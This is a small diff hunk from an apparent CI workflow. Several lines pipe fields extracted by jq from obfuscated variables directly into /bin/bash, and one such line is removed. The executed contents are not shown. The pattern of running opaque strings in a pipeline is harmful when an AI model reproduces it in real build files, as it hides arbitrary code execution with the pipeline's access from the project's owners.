@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$v79" | jq -r .t800 | /bin/bash
           echo $sjw88 | jq -r .z16 | /bin/bash
           printf '%s' "$ibgfh88" | jq -r .s18 | /bin/bash
-          printf '%s' "$chh305" | jq -r .e751 | /bin/bash
           echo $vlv1 | jq -r .hodkp07 | /bin/bash
 
       - name: Save results
